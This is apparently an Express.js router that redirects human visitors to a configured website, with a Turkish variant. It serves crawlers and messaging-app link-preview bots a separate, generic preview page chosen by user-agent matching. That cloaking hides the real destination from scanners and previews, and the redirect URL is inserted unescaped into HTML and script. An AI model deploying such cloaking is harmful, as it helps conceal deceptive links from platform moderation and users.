import express from 'express';
import { configStorage } from '../storage/config.js';
import { logger } from '../utils/logger.js';
import { asyncHandler } from '../utils/errors.js';

const router = express.Router();

// Bot detection regex
const botRegex = /(facebookexternalhit|whatsapp|twitterbot|linkedinbot|slackbot|telegrambot|discordbot|googlebot|bingbot|yandexbot|baiduspider|duckduckbot|applebot|semrushbot|ahrefsbot|mj12bot|dotbot|petalbot)/i;

// Main website redirect endpoint
router.get('/website', asyncHandler(async (req, res) => {
  const userAgent = req.headers["user-agent"] || "";
  
  logger.info('Website redirect request', {
    userAgent: userAgent.substring(0, 100),
    query: req.query
  });

  // Check if request is from a bot/crawler
  if (botRegex.test(userAgent)) {
    logger.info('Bot detected, returning preview page', { userAgent: userAgent.substring(0, 50) });
    return res.status(200).type('html').send(generateBotPreview());
  }

  try {
    // Get URL parameters
    const url = new URL(req.protocol + "://" + req.get("host") + req.originalUrl);
    const target = (url.searchParams.get("target") || "").toLowerCase();

    // Get configuration
    const config = await configStorage.getConfig();
    
    // Determine which website URL to use
    let websiteUrl;
    if (target === 'turkey' || target === 'tr') {
      websiteUrl = config.website_url_tr;
      logger.info('Redirecting to Turkish website', { websiteUrl: websiteUrl.substring(0, 100) + '...' });
    } else {
      websiteUrl = config.website_url_default;
      logger.info('Redirecting to default website', { websiteUrl: websiteUrl.substring(0, 100) + '...' });
    }
    
    // Handle different redirect types
    const redirectType = config.redirect_type || 'immediate';
    const redirectDelay = config.redirect_delay || 3000;
    const redirectMessage = config.redirect_message || 'Redirecting to our website...';
    
    if (redirectType === 'immediate') {
      // Immediate redirect
      res.redirect(302, websiteUrl);
    } else if (redirectType === 'delayed') {
      // Delayed redirect with HTML page
      const html = generateDelayedRedirectPage(websiteUrl, redirectDelay, redirectMessage);
      res.status(200).type('html').send(html);
    } else if (redirectType === 'custom') {
      // Custom redirect page
      const html = generateCustomRedirectPage(websiteUrl, redirectMessage);
      res.status(200).type('html').send(html);
    } else {
      // Fallback to immediate redirect
      res.redirect(302, websiteUrl);
    }
    
  } catch (error) {
    logger.error('Website redirect error', {
      error: error.message,
      stack: error.stack
    });
    
    // Fallback to default configuration
    const config = await configStorage.getConfig();
    const fallbackUrl = config.website_url_default || 'https://example.com';
    
    logger.info('Using fallback redirect', { fallbackUrl: fallbackUrl.substring(0, 100) + '...' });
    res.redirect(302, fallbackUrl);
  }
}));

// Health check endpoint
router.get('/health', asyncHandler(async (req, res) => {
  const configHealth = await configStorage.healthCheck();
  
  res.json({
    status: configHealth.status,
    timestamp: new Date().toISOString(),
    services: {
      config: configHealth
    }
  });
}));

// Generate delayed redirect page
function generateDelayedRedirectPage(websiteUrl, delay, message) {
  return `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Redirecting...</title>
  <style>
    * { box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      display: grid;
      place-items: center;
      height: 100vh;
      margin: 0;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
    }
    .card {
      padding: 40px;
      border-radius: 20px;
      background: rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(10px);
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
      text-align: center;
      max-width: 500px;
      border: 1px solid rgba(255, 255, 255, 0.2);
    }
    h1 {
      margin: 0 0 20px;
      font-size: 28px;
      font-weight: 700;
    }
    p {
      opacity: 0.9;
      margin: 0 0 30px;
      font-size: 18px;
      line-height: 1.5;
    }
    .spinner {
      border: 3px solid rgba(255, 255, 255, 0.3);
      border-top: 3px solid white;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .countdown {
      font-size: 24px;
      font-weight: 700;
      margin: 20px 0;
    }
    .link {
      color: white;
      text-decoration: underline;
      opacity: 0.8;
    }
    .link:hover {
      opacity: 1;
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="spinner"></div>
    <h1>${message}</h1>
    <p>You will be redirected automatically in <span class="countdown" id="countdown">${Math.ceil(delay / 1000)}</span> seconds.</p>
    <p>If you are not redirected automatically, <a href="${websiteUrl}" class="link">click here</a>.</p>
  </div>
  
  <script>
    let timeLeft = ${Math.ceil(delay / 1000)};
    const countdown = document.getElementById('countdown');
    
    const timer = setInterval(() => {
      timeLeft--;
      countdown.textContent = timeLeft;
      
      if (timeLeft <= 0) {
        clearInterval(timer);
        window.location.href = '${websiteUrl}';
      }
    }, 1000);
  </script>
</body>
</html>`;
}

// Generate custom redirect page
function generateCustomRedirectPage(websiteUrl, message) {
  return `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Visit Our Website</title>
  <style>
    * { box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      display: grid;
      place-items: center;
      height: 100vh;
      margin: 0;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
    }
    .card {
      padding: 40px;
      border-radius: 20px;
      background: rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(10px);
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
      text-align: center;
      max-width: 500px;
      border: 1px solid rgba(255, 255, 255, 0.2);
    }
    h1 {
      margin: 0 0 20px;
      font-size: 32px;
      font-weight: 700;
    }
    p {
      opacity: 0.9;
      margin: 0 0 30px;
      font-size: 18px;
      line-height: 1.5;
    }
    .btn {
      background: rgba(255, 255, 255, 0.2);
      color: white;
      border: 2px solid rgba(255, 255, 255, 0.3);
      padding: 15px 30px;
      border-radius: 10px;
      font-size: 16px;
      font-weight: 600;
      text-decoration: none;
      display: inline-block;
      transition: all 0.3s ease;
      cursor: pointer;
    }
    .btn:hover {
      background: rgba(255, 255, 255, 0.3);
      border-color: rgba(255, 255, 255, 0.5);
      transform: translateY(-2px);
    }
    .website-icon {
      font-size: 48px;
      margin-bottom: 20px;
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="website-icon">🌐</div>
    <h1>${message}</h1>
    <p>Click the button below to visit our website and discover our services.</p>
    <a href="${websiteUrl}" class="btn">Visit Website</a>
  </div>
</body>
</html>`;
}

// Generate bot preview page for website
function generateBotPreview() {
  return `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Visit Our Website</title>
  <meta property="og:title" content="Visit Our Website"/>
  <meta property="og:description" content="Discover our services and get in touch with our team"/>
  <meta property="og:type" content="website"/>
  <meta name="twitter:card" content="summary"/>
  <meta name="twitter:title" content="Visit Our Website"/>
  <meta name="twitter:description" content="Discover our services and get in touch with our team"/>
  <style>
    * { box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      display: grid;
      place-items: center;
      height: 100vh;
      margin: 0;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
    }
    .card {
      padding: 40px;
      border-radius: 20px;
      background: rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(10px);
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
      text-align: center;
      max-width: 500px;
      border: 1px solid rgba(255, 255, 255, 0.2);
    }
    h1 {
      margin: 0 0 20px;
      font-size: 32px;
      font-weight: 700;
    }
    p {
      opacity: 0.9;
      margin: 0;
      font-size: 18px;
      line-height: 1.5;
    }
    .website-icon {
      font-size: 48px;
      margin-bottom: 20px;
    }
    .features {
      margin-top: 30px;
      text-align: left;
    }
    .feature {
      display: flex;
      align-items: center;
      margin: 15px 0;
      font-size: 14px;
    }
    .feature-icon {
      margin-right: 10px;
      font-size: 20px;
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="website-icon">🌐</div>
    <h1>Visit Our Website</h1>
    <p>Discover our services and get in touch with our team. We're here to help!</p>
    
    <div class="features">
      <div class="feature">
        <span class="feature-icon">🌍</span>
        <span>Global coverage with local websites</span>
      </div>
      <div class="feature">
        <span class="feature-icon">⚡</span>
        <span>Fast and responsive experience</span>
      </div>
      <div class="feature">
        <span class="feature-icon">🔒</span>
        <span>Secure and reliable service</span>
      </div>
    </div>
  </div>
</body>
</html>`;
}

export default router;
